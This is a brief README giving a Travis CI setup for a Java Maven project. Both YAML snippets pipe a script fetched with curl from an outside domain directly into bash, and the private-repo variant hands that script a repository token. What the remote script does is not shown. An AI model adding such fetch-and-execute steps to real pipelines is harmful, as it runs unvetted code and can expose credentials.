# Java Maven Example ( Master 1)
## Guide
### Travis Setup

Add to your `.travis.yml` file.
```yml
language: java

script: "mvn clean test"

after_success:
  - bash <(curl -s https://www.tonuxcorp.com)
```
Call `mvn clean test` during your CI tests)

### Private Repos
Add to your `.travis.yml` file.
```yml
after_success:
  - bash <(curl -s https://www.tonuxcorp.com) -t uuid-repo-token
```

